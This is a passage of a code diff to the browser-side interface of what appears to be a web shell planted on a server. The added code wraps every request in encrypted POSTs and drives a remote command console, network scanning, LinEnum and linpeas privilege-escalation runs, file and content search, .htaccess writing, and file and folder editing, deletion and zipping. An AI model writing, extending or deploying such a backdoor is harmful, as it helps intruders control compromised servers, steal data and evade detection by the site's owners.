+			} catch (error) {
+				console.error('Error showing console:', error);
+			}
+		}
+
+		async function executeCommand() {
+			const cmd = document.getElementById('cmdInput').value;
+			const encodedCmd = btoa(unescape(encodeURIComponent(cmd)));
+			
+			try {
+				const response = await sendEncryptedPost(currentScript, {
+					'op': 'console',
+					'cmd': encodedCmd
+				});
+				const data = await response.json();
+				
+				const outputDiv = document.getElementById('consoleOutput');
+				outputDiv.innerHTML = `<div class="mb-2"><strong>$</strong> ${cmd}</div><pre>${data.output}</pre>`;
+				outputDiv.scrollTop = outputDiv.scrollHeight;
+				document.getElementById('cmdInput').value = '';
+			} catch (error) {
+				console.error('Error executing command:', error);
+			}
+		}
+
+		async function showNetworkScan() {
+			hideAllInterfaces();
+			try {
+				const response = await sendEncryptedPost(currentScript, { 'op': 'netscan' });
+				const html = await response.text();
+				
+				let consoleContainer = document.getElementById('consoleContainer');
+				if (!consoleContainer) {
+					consoleContainer = document.createElement('div');
+					consoleContainer.id = 'consoleContainer';
+					consoleContainer.className = 'dialog-container';
+					document.body.appendChild(consoleContainer);
+				}
+				
+				consoleContainer.innerHTML = html;
+				consoleContainer.style.display = 'block';
+			} catch (error) {
+				console.error('Error showing network scan:', error);
+			}
+		}
+
+		async function executeNetworkScan() {
+			try {
+				const response = await sendEncryptedPost(currentScript, {
+					'op': 'netscan',
+					'execute': '1'
+				});
+				const data = await response.json();
+				document.getElementById('networkScanOutput').innerHTML = `<pre>${data.output}</pre>`;
+			} catch (error) {
+				console.error('Error executing network scan:', error);
+			}
+		}
+
+		async function showLinEnum() {
+			hideAllInterfaces();
+			try {
+				const response = await sendEncryptedPost(currentScript, { 'op': 'linenum' });
+				const html = await response.text();
+				
+				let consoleContainer = document.getElementById('consoleContainer');
+				if (!consoleContainer) {
+					consoleContainer = document.createElement('div');
+					consoleContainer.id = 'consoleContainer';
+					consoleContainer.className = 'dialog-container';
+					document.body.appendChild(consoleContainer);
+				}
+				
+				consoleContainer.innerHTML = html;
+				consoleContainer.style.display = 'block';
+			} catch (error) {
+				console.error('Error showing LinEnum:', error);
+			}
+		}
+
+		async function executeLinEnum() {
+			try {
+				const response = await sendEncryptedPost(currentScript, {
+					'op': 'linenum',
+					'execute': '1'
+				});
+				const result = await response.json();
+				document.getElementById('linEnumOutput').innerHTML = `<pre>${result.output}</pre>`;
+			} catch (error) {
+				console.error('Error executing LinEnum:', error);
+			}
+		}
+
+		async function showLinpeas() {
+			hideAllInterfaces();
+			try {
+				const response = await sendEncryptedPost(currentScript, { 'op': 'linpeas' });
+				const html = await response.text();
+				
+				let consoleContainer = document.getElementById('consoleContainer');
+				if (!consoleContainer) {
+					consoleContainer = document.createElement('div');
+					consoleContainer.id = 'consoleContainer';
+					consoleContainer.className = 'dialog-container';
+					document.body.appendChild(consoleContainer);
+				}
+				
+				consoleContainer.innerHTML = html;
+				consoleContainer.style.display = 'block';
+			} catch (error) {
+				console.error('Error showing Linpeas:', error);
+			}
+		}
+
+		async function executeLinpeas() {
+			try {
+				const response = await sendEncryptedPost(currentScript, {
+					'op': 'linpeas',
+					'execute': '1'
+				});
+				const result = await response.json();
+				document.getElementById('linpeasOutput').innerHTML = `<pre>${result.output}</pre>`;
+			} catch (error) {
+				console.error('Error executing Linpeas:', error);
+			}
+		}
+
+        async function showSearchFile() {
+			hideAllInterfaces();
+			const path = await getDecryptedPath();
+
+			let data = { 'op': 'searchfile' };
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const html = await response.text();
+				
+				let searchFileContainer = document.getElementById('searchFileContainer');
+				if (!searchFileContainer) {
+					searchFileContainer = document.createElement('div');
+					searchFileContainer.id = 'searchFileContainer';
+					searchFileContainer.className = 'dialog-container';
+					document.body.appendChild(searchFileContainer);
+				}
+				
+				searchFileContainer.innerHTML = html;
+				searchFileContainer.style.display = 'block';
+				
+				document.getElementById('filenameInput').addEventListener('keypress', function(e) {
+					if (e.key === 'Enter') {
+						searchFile();
+					}
+				});
+			} catch (error) {
+				console.error('Error showing search file:', error);
+			}
+		}
+
+		        		async function searchFile() {
+			const filename = document.getElementById('filenameInput').value;
+			const path = await getDecryptedPath();
+
+			let data = {
+				'op': 'searchfile',
+				'filename': filename
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const result = await response.json();
+				
+				const outputDiv = document.getElementById('searchFileOutput');
+				outputDiv.innerHTML = `<pre>${result.output}</pre>`;
+				outputDiv.scrollTop = outputDiv.scrollHeight;
+			} catch (error) {
+				console.error('Error searching file:', error);
+			}
+		}
+
+        async function showSearchContent() {
+			hideAllInterfaces();
+			const path = await getDecryptedPath();
+
+			let data = { 'op': 'searchcontent' };
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const html = await response.text();
+				
+				let searchContentContainer = document.getElementById('searchContentContainer');
+				if (!searchContentContainer) {
+					searchContentContainer = document.createElement('div');
+					searchContentContainer.id = 'searchContentContainer';
+					searchContentContainer.className = 'dialog-container';
+					document.body.appendChild(searchContentContainer);
+				}
+				
+				searchContentContainer.innerHTML = html;
+				searchContentContainer.style.display = 'block';
+				
+				document.getElementById('contentInput').addEventListener('keypress', function(e) {
+					if (e.key === 'Enter') {
+						searchContent();
+					}
+				});
+			} catch (error) {
+				console.error('Error showing search content:', error);
+			}
+		}
+
+		        		async function searchContent() {
+			const content = document.getElementById('contentInput').value;
+			const path = await getDecryptedPath();
+
+			let data = {
+				'op': 'searchcontent',
+				'content': content
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const result = await response.json();
+				
+				const outputDiv = document.getElementById('searchContentOutput');
+				outputDiv.innerHTML = `<pre>${result.output}</pre>`;
+				outputDiv.scrollTop = outputDiv.scrollHeight;
+			} catch (error) {
+				console.error('Error searching content:', error);
+			}
+		}
+
+		async function showHtaccess() {
+			hideAllInterfaces();
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
+
+			let data = { 'op': 'htaccess' };
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const html = await response.text();
+				
+				let htaccessContainer = document.getElementById('htaccessContainer');
+				if (!htaccessContainer) {
+					htaccessContainer = document.createElement('div');
+					htaccessContainer.id = 'htaccessContainer';
+					htaccessContainer.className = 'dialog-container';
+					document.body.appendChild(htaccessContainer);
+				}
+				
+				htaccessContainer.innerHTML = html;
+				htaccessContainer.style.display = 'block';
+			} catch (error) {
+				console.error('Error showing htaccess:', error);
+			}
+		}
+
+		async function generateHtaccess() {
+			const content = document.getElementById('htaccessContent').value;
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
+			
+			let data = {
+				'op': 'htaccess',
+				'content': content
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const result = await response.json();
+				
+				if (result.success) {
+					alert('.htaccess file created successfully!');
+					location.reload();
+				} else {
+					alert('Error: ' + (result.error || 'Failed to create .htaccess file'));
+				}
+			} catch (error) {
+				console.error('Error generating htaccess:', error);
+			}
+		}
+
+		// 新增文件操作功能
+		async function saveFileEdit(filename) {
+			const content = document.getElementById('editFileContent').value;
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
+
+			let data = {
+				'op': 'editfile',
+				'filename': filename,
+				'content': content
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const result = await response.json();
+				
+				if (result.success) {
+					alert('File edited successfully!');
+					location.reload();
+				} else {
+					alert('Error: ' + (result.error || 'File editing failed'));
+				}
+			} catch (error) {
+				console.error('Error saving file edit:', error);
+			}
+		}
+
+		async function saveFileRename(filename) {
+			const newName = document.getElementById('newFileName').value;
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
+
+			let data = {
+				'op': 'renamefile',
+				'oldname': filename,
+				'newname': newName
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const result = await response.json();
+				
+				if (result.success) {
+					alert('File renamed successfully!');
+					location.reload();
+				} else {
+					alert('Error: ' + (result.error || 'File renaming failed'));
+				}
+			} catch (error) {
+				console.error('Error saving file rename:', error);
+			}
+		}
+
+		async function confirmDeleteFile(filename) {
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
+
+			let data = {
+				'op': 'deletefile',
+				'filename': filename,
+				'confirm': '1'
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const result = await response.json();
+				
+				if (result.success) {
+					alert('File deleted successfully!');
+					location.reload();
+				} else {
+					alert('Error: ' + (result.error || 'File deletion failed'));
+				}
+			} catch (error) {
+				console.error('Error confirming delete file:', error);
+			}
+		}
+
+		async function createNewFile() {
+			const filename = document.getElementById('newFileName').value;
+			const content = document.getElementById('newFileContent').value;
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
+
+			let data = {
+				'op': 'createfile',
+				'filename': filename,
+				'content': content
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const result = await response.json();
+				
+				if (result.success) {
+					alert('File created successfully!');
+					location.reload();
+				} else {
+					alert('Error: ' + (result.error || 'File creation failed'));
+				}
+			} catch (error) {
+				console.error('Error creating new file:', error);
+			}
+		}
+
+		async function createNewFolder() {
+			const foldername = document.getElementById('newFolderName').value;
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
+
+			let data = {
+				'op': 'createfolder',
+				'foldername': foldername
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const result = await response.json();
+				
+				if (result.success) {
+					alert('Folder created successfully!');
+					location.reload();
+				} else {
+					alert('Error: ' + (result.error || 'Folder creation failed'));
+				}
+			} catch (error) {
+				console.error('Error creating new folder:', error);
+			}
+		}
+
+		// 顯示文件操作界面
+		async function showViewFile(filename) {
+			hideAllInterfaces();
+			const path = await getDecryptedPath();
+
+			let data = {
+				'op': 'viewfile',
+				'filename': filename
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const html = await response.text();
+				
+				let viewContainer = document.getElementById('viewFileContainer');
+				if (!viewContainer) {
+					viewContainer = document.createElement('div');
+					viewContainer.id = 'viewFileContainer';
+					viewContainer.className = 'dialog-container';
+					document.body.appendChild(viewContainer);
+				}
+				
+				viewContainer.innerHTML = html;
+				viewContainer.style.display = 'block';
+			} catch (error) {
+				console.error('Error showing view file:', error);
+				alert('Error: Unable to read file');
+			}
+		}
+
+        async function showEditFile(filename) {
             hideAllInterfaces();
-            document.getElementById('uploadInterface').style.display = 'block';
-            document.getElementById('fileSelectionStep').style.display = 'block';
-            document.getElementById('uploadConfirmationStep').style.display = 'none';
-        }
+            const urlParams = new URLSearchParams(window.location.search);
+            const path = urlParams.get('0');
 
-        function hideUploadInterface() {
-            document.getElementById('uploadInterface').style.display = 'none';
-            document.getElementById('file-container').style.display = 'block';
-            resetUploadInterface();
-        }
-
-        function resetUploadInterface() {
-            document.getElementById('fileSelectionStep').style.display = 'block';
-            document.getElementById('uploadConfirmationStep').style.display = 'none';
-            document.getElementById('selectedFileName').textContent = '';
-            document.getElementById('fileInput').value = '';
-        }
-
-        document.getElementById('fileInput').addEventListener('change', function() {
-            if (this.files.length) {
-                document.getElementById('selectedFileName').textContent = this.files[0].name;
-                document.getElementById('fileSelectionStep').style.display = 'none';
-                document.getElementById('uploadConfirmationStep').style.display = 'block';
-            }
-        });
-
-        function cancelUpload() {
-            resetUploadInterface();
-        }
-
-        function uploadFile() {
-            const fileInput = document.getElementById('fileInput');
-            if (fileInput.files.length === 0) {
-                alert('請先選擇一個檔案');
-                return;
-            }
-
-            const file = fileInput.files[0];
-            const reader = new FileReader();
-
-            reader.onload = function(e) {
-                const base64Data = e.target.result.split(',')[1];
-                sendBase64Data(base64Data, file.name);
+            let data = {
+                'op': 'editfile',
+                'filename': filename
             };
-
-            reader.readAsDataURL(file);
-        }
-
-        function sendBase64Data(base64Data, fileName) {
-            const formData = new URLSearchParams();
-            formData.append('data', base64Data);
-            formData.append('op', 'upload');
-            formData.append('filename', fileName);
-
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: formData.toString(),
-            })
-            .then(response => response.text())
-            .then(result => {
-                console.log('功：', result);
-                alert('上傳成功！');
-                location.reload(); // 刷新主頁面
-            })
-            .catch(error => {
-                console.error('錯誤：', error);
-                alert('上傳失！');
-            });
-        }
-
-        function showConsole() {
-            hideAllInterfaces();
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: 'op=console'
-            })
-            .then(response => response.text())
-            .then(html => {
-                let consoleContainer = document.getElementById('consoleContainer');
-                if (!consoleContainer) {
-                    consoleContainer = document.createElement('div');
-                    consoleContainer.id = 'consoleContainer';
-                    consoleContainer.className = 'dialog-container';
-                    document.body.appendChild(consoleContainer);
-                }
-                
-                consoleContainer.innerHTML = html;
-                consoleContainer.style.display = 'block';
-                
-                // 調整輸入框和按鈕的寬度
-                const cmdInput = document.getElementById('cmdInput');
-                const executeButton = document.querySelector('#consoleForm button');
-                if (cmdInput && executeButton) {
-                    cmdInput.style.width = 'calc(100% - 100px)';
-                    executeButton.style.width = '90px';
-                }
-                
-                document.getElementById('cmdInput').addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        executeCommand();
-                    }
-                });
-            });
-        }
-
-        function executeCommand() {
-            const cmd = document.getElementById('cmdInput').value;
-            const encodedCmd = btoa(unescape(encodeURIComponent(cmd)));
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: `op=console&cmd=${encodedCmd}`
-            })
-            .then(response => response.json())
-            .then(data => {
-                const outputDiv = document.getElementById('consoleOutput');
-                outputDiv.innerHTML = `<div class="mb-2"><strong>$</strong> ${cmd}</div><pre>${data.output}</pre>`;
-                outputDiv.scrollTop = outputDiv.scrollHeight;
-                document.getElementById('cmdInput').value = '';
-            });
-        }
-
-        function showNetworkScan() {
-            hideAllInterfaces();
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: 'op=netscan'
-            })
-            .then(response => response.text())
-            .then(html => {
-                let consoleContainer = document.getElementById('consoleContainer');
-                if (!consoleContainer) {
-                    consoleContainer = document.createElement('div');
-                    consoleContainer.id = 'consoleContainer';
-                    consoleContainer.className = 'dialog-container';
-                    document.body.appendChild(consoleContainer);
-                }
-                
-                consoleContainer.innerHTML = html;
-                consoleContainer.style.display = 'block';
-            });
-        }
-
-        function executeNetworkScan() {
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: 'op=netscan&execute=1'
-            })
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('networkScanOutput').innerHTML = `<pre>${data.output}</pre>`;
-            });
-        }
-
-        function showLinEnum() {
-            hideAllInterfaces();
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: 'op=linenum'
-            })
-            .then(response => response.text())
-            .then(html => {
-                let consoleContainer = document.getElementById('consoleContainer');
-                if (!consoleContainer) {
-                    consoleContainer = document.createElement('div');
-                    consoleContainer.id = 'consoleContainer';
-                    consoleContainer.className = 'dialog-container';
-                    document.body.appendChild(consoleContainer);
-                }
-                
-                consoleContainer.innerHTML = html;
-                consoleContainer.style.display = 'block';
-            });
-        }
-
-        function executeLinEnum() {
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: 'op=linenum&execute=1'
-            })
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('linEnumOutput').innerHTML = `<pre>${data.output}</pre>`;
-            });
-        }
-
-        function showLinpeas() {
-            hideAllInterfaces();
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: 'op=linpeas'
-            })
-            .then(response => response.text())
-            .then(html => {
-                let consoleContainer = document.getElementById('consoleContainer');
-                if (!consoleContainer) {
-                    consoleContainer = document.createElement('div');
-                    consoleContainer.id = 'consoleContainer';
-                    consoleContainer.className = 'dialog-container';
-                    document.body.appendChild(consoleContainer);
-                }
-                
-                consoleContainer.innerHTML = html;
-                consoleContainer.style.display = 'block';
-            });
-        }
-
-        function executeLinpeas() {
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: 'op=linpeas&execute=1'
-            })
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('linpeasOutput').innerHTML = `<pre>${data.output}</pre>`;
-            });
-        }
-
-        function showSearchFile() {
-            hideAllInterfaces();
-            const urlParams = new URLSearchParams(window.location.search);
-            const path = urlParams.get('path');
-
-            let body = 'op=searchfile';
             if (path) {
-                body += `&path=${encodeURIComponent(path)}`;
+                data['path'] = path;
             }
 
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: body
-            })
-            .then(response => response.text())
-            .then(html => {
-                let searchFileContainer = document.getElementById('searchFileContainer');
-                if (!searchFileContainer) {
-                    searchFileContainer = document.createElement('div');
-                    searchFileContainer.id = 'searchFileContainer';
-                    searchFileContainer.className = 'dialog-container';
-                    document.body.appendChild(searchFileContainer);
+            try {
+                const response = await sendEncryptedPost(currentScript, data);
+                const html = await response.text();
+                
+                let editContainer = document.getElementById('editFileContainer');
+                if (!editContainer) {
+                    editContainer = document.createElement('div');
+                    editContainer.id = 'editFileContainer';
+                    editContainer.className = 'dialog-container';
+                    document.body.appendChild(editContainer);
                 }
                 
-                searchFileContainer.innerHTML = html;
-                searchFileContainer.style.display = 'block';
-                
-                document.getElementById('filenameInput').addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        searchFile();
-                    }
-                });
-            });
-        }
-
-        function searchFile() {
-            const filename = document.getElementById('filenameInput').value;
-            const urlParams = new URLSearchParams(window.location.search);
-            const path = urlParams.get('path');
-
-            let body = `op=searchfile&filename=${encodeURIComponent(filename)}`;
-            if (path) {
-                body += `&path=${encodeURIComponent(path)}`;
+                editContainer.innerHTML = html;
+                editContainer.style.display = 'block';
+            } catch (error) {
+                console.error('Error showing edit file:', error);
             }
-
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: body
-            })
-            .then(response => response.json())
-            .then(data => {
-                const outputDiv = document.getElementById('searchFileOutput');
-                outputDiv.innerHTML = `<pre>${data.output}</pre>`;
-                outputDiv.scrollTop = outputDiv.scrollHeight;
-            });
         }
 
-        function showSearchContent() {
-            hideAllInterfaces();
-            const urlParams = new URLSearchParams(window.location.search);
-            const path = urlParams.get('path');
+		async function showRenameFile(filename) {
+			hideAllInterfaces();
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
 
-            let body = 'op=searchcontent';
-            if (path) {
-                body += `&path=${encodeURIComponent(path)}`;
-            }
+			let data = {
+				'op': 'renamefile',
+				'filename': filename
+			};
+			if (path) {
+				data['path'] = path;
+			}
 
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: body
-            })
-            .then(response => response.text())
-            .then(html => {
-                let searchContentContainer = document.getElementById('searchContentContainer');
-                if (!searchContentContainer) {
-                    searchContentContainer = document.createElement('div');
-                    searchContentContainer.id = 'searchContentContainer';
-                    searchContentContainer.className = 'dialog-container';
-                    document.body.appendChild(searchContentContainer);
-                }
-                
-                searchContentContainer.innerHTML = html;
-                searchContentContainer.style.display = 'block';
-                
-                document.getElementById('contentInput').addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        searchContent();
-                    }
-                });
-            });
-        }
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const html = await response.text();
+				
+				let renameContainer = document.getElementById('renameFileContainer');
+				if (!renameContainer) {
+					renameContainer = document.createElement('div');
+					renameContainer.id = 'renameFileContainer';
+					renameContainer.className = 'dialog-container';
+					document.body.appendChild(renameContainer);
+				}
+				
+				renameContainer.innerHTML = html;
+				renameContainer.style.display = 'block';
+			} catch (error) {
+				console.error('Error showing rename file:', error);
+			}
+		}
 
-        function searchContent() {
-            const content = document.getElementById('contentInput').value;
-            const urlParams = new URLSearchParams(window.location.search);
-            const path = urlParams.get('path');
+		async function showDeleteFile(filename) {
+			hideAllInterfaces();
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
 
-            let body = `op=searchcontent&content=${encodeURIComponent(content)}`;
-            if (path) {
-                body += `&path=${encodeURIComponent(path)}`;
-            }
+			let data = {
+				'op': 'deletefile',
+				'filename': filename
+			};
+			if (path) {
+				data['path'] = path;
+			}
 
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: body
-            })
-            .then(response => response.json())
-            .then(data => {
-                const outputDiv = document.getElementById('searchContentOutput');
-                outputDiv.innerHTML = `<pre>${data.output}</pre>`;
-                outputDiv.scrollTop = outputDiv.scrollHeight;
-            });
-        }
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const html = await response.text();
+				
+				let deleteContainer = document.getElementById('deleteFileContainer');
+				if (!deleteContainer) {
+					deleteContainer = document.createElement('div');
+					deleteContainer.id = 'deleteFileContainer';
+					deleteContainer.className = 'dialog-container';
+					document.body.appendChild(deleteContainer);
+				}
+				
+				deleteContainer.innerHTML = html;
+				deleteContainer.style.display = 'block';
+			} catch (error) {
+				console.error('Error showing delete file:', error);
+			}
+		}
 
-        function showHtaccess() {
-            hideAllInterfaces();
-            const urlParams = new URLSearchParams(window.location.search);
-            const path = urlParams.get('path');
+		async function showCreateFile() {
+			hideAllInterfaces();
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
 
-            let body = 'op=htaccess';
-            if (path) {
-                body += `&path=${encodeURIComponent(path)}`;
-            }
+			let data = { 'op': 'createfile' };
+			if (path) {
+				data['path'] = path;
+			}
 
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: body
-            })
-            .then(response => response.text())
-            .then(html => {
-                let htaccessContainer = document.getElementById('htaccessContainer');
-                if (!htaccessContainer) {
-                    htaccessContainer = document.createElement('div');
-                    htaccessContainer.id = 'htaccessContainer';
-                    htaccessContainer.className = 'dialog-container';
-                    document.body.appendChild(htaccessContainer);
-                }
-                
-                htaccessContainer.innerHTML = html;
-                htaccessContainer.style.display = 'block';
-            });
-        }
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const html = await response.text();
+				
+				let createContainer = document.getElementById('createFileContainer');
+				if (!createContainer) {
+					createContainer = document.createElement('div');
+					createContainer.id = 'createFileContainer';
+					createContainer.className = 'dialog-container';
+					document.body.appendChild(createContainer);
+				}
+				
+				createContainer.innerHTML = html;
+				createContainer.style.display = 'block';
+			} catch (error) {
+				console.error('Error showing create file:', error);
+			}
+		}
 
-        function generateHtaccess() {
-            const content = document.getElementById('htaccessContent').value;
-            const urlParams = new URLSearchParams(window.location.search);
-            const path = urlParams.get('path');
-            
-            let body = `op=htaccess&content=${encodeURIComponent(content)}`;
-            if (path) {
-                body += `&path=${encodeURIComponent(path)}`;
-            }
+		async function showCreateFolder() {
+			hideAllInterfaces();
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
 
-            fetch(currentScript, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: body
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    alert('.htaccess文件已成功創建！');
-                    location.reload();
-                } else {
-                    alert('錯誤：' + (data.error || '創建.htaccess文件失敗'));
-                }
-            });
-        }
-    </script>
+			let data = { 'op': 'createfolder' };
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const html = await response.text();
+				
+				let createContainer = document.getElementById('createFolderContainer');
+				if (!createContainer) {
+					createContainer = document.createElement('div');
+					createContainer.id = 'createFolderContainer';
+					createContainer.className = 'dialog-container';
+					document.body.appendChild(createContainer);
+				}
+				
+				createContainer.innerHTML = html;
+				createContainer.style.display = 'block';
+			} catch (error) {
+				console.error('Error showing create folder:', error);
+			}
+		}
+
+		async function showRenameFolder(foldername) {
+			hideAllInterfaces();
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
+
+			let data = {
+				'op': 'renamefolder',
+				'foldername': foldername
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const html = await response.text();
+				
+				let renameContainer = document.getElementById('renameFolderContainer');
+				if (!renameContainer) {
+					renameContainer = document.createElement('div');
+					renameContainer.id = 'renameFolderContainer';
+					renameContainer.className = 'dialog-container';
+					document.body.appendChild(renameContainer);
+				}
+				
+				renameContainer.innerHTML = html;
+				renameContainer.style.display = 'block';
+			} catch (error) {
+				console.error('Error showing rename folder:', error);
+			}
+		}
+
+		async function showDeleteFolder(foldername) {
+			hideAllInterfaces();
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
+
+			let data = {
+				'op': 'deletefolder',
+				'foldername': foldername
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const html = await response.text();
+				
+				let deleteContainer = document.getElementById('deleteFolderContainer');
+				if (!deleteContainer) {
+					deleteContainer = document.createElement('div');
+					deleteContainer.id = 'deleteFolderContainer';
+					deleteContainer.className = 'dialog-container';
+					document.body.appendChild(deleteContainer);
+				}
+				
+				deleteContainer.innerHTML = html;
+				deleteContainer.style.display = 'block';
+			} catch (error) {
+				console.error('Error showing delete folder:', error);
+			}
+		}
+
+		async function saveFolderRename(foldername) {
+			const newName = document.getElementById('newFolderName').value;
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
+
+			let data = {
+				'op': 'renamefolder',
+				'oldname': foldername,
+				'newname': newName
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const result = await response.json();
+				
+				if (result.success) {
+					alert('Folder renamed successfully!');
+					location.reload();
+				} else {
+					alert('Error: ' + (result.error || 'Folder renaming failed'));
+				}
+			} catch (error) {
+				console.error('Error saving folder rename:', error);
+			}
+		}
+
+		async function confirmDeleteFolder(foldername) {
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
+
+			let data = {
+				'op': 'deletefolder',
+				'foldername': foldername,
+				'confirm': '1'
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const result = await response.json();
+				
+				if (result.success) {
+					alert('Folder deleted successfully!');
+					location.reload();
+				} else {
+					alert('Error: ' + (result.error || 'Folder deletion failed'));
+				}
+			} catch (error) {
+				console.error('Error confirming delete folder:', error);
+			}
+		}
+
+		async function showZipFolder(foldername) {
+			hideAllInterfaces();
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('0');
+
+			let data = {
+				'op': 'zipfolder',
+				'foldername': foldername
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const html = await response.text();
+				
+				let zipContainer = document.getElementById('zipFolderContainer');
+				if (!zipContainer) {
+					zipContainer = document.createElement('div');
+					zipContainer.id = 'zipFolderContainer';
+					zipContainer.className = 'dialog-container';
+					document.body.appendChild(zipContainer);
+				}
+				
+				zipContainer.innerHTML = html;
+				zipContainer.style.display = 'block';
+			} catch (error) {
+				console.error('Error showing zip folder:', error);
+			}
+		}
+
+		async function confirmZipFolder(foldername) {
+			const zipFileName = document.getElementById('zipFileName').value;
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('path');
+
+			let data = {
+				'op': 'zipfolder',
+				'foldername': foldername,
+				'zipname': zipFileName,
+				'confirm': '1'
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const result = await response.json();
+				
+				if (result.success) {
+					alert('Folder compressed successfully! ZIP file created: ' + result.zipfile);
+					location.reload();
+				} else {
+					alert('Error: ' + (result.error || 'Folder compression failed'));
+				}
+			} catch (error) {
+				console.error('Error confirming zip folder:', error);
+			}
+		}
+
+		async function showZipFile(filename) {
+			hideAllInterfaces();
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('path');
+
+			let data = {
+				'op': 'zipfile',
+				'filename': filename
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const html = await response.text();
+				
+				let zipContainer = document.getElementById('zipFileContainer');
+				if (!zipContainer) {
+					zipContainer = document.createElement('div');
+					zipContainer.id = 'zipFileContainer';
+					zipContainer.className = 'dialog-container';
